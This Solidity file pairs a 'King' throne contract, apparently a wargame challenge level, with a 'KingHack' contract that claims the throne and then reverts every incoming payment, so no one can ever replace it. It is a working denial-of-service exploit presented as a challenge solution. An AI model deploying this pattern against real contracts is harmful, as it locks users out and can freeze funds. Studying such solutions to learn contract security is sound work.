// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract King {
    address payable king;
    uint256 public prize;
    address payable public owner;
    event Receive(address sender, uint256 value);

    constructor() public payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        emit Receive(msg.sender, msg.value);
        king.transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address payable) {
        return king;
    }
}

contract KingHack {
    bool public tookOwnership;
    King public _king;

    constructor(address payable king) public payable {
        _king = King(king);
    }

    function stealReign() public {
        address(_king).call{value: 1000000000000000, gas: 107705000390820}("");
    }

    function getBalance() public returns (uint256) {
        return address(this).balance;
    }

    receive() external payable {
        if (tookOwnership) {
            revert("1");
        } else {
            tookOwnership = true;
        }
    }
}
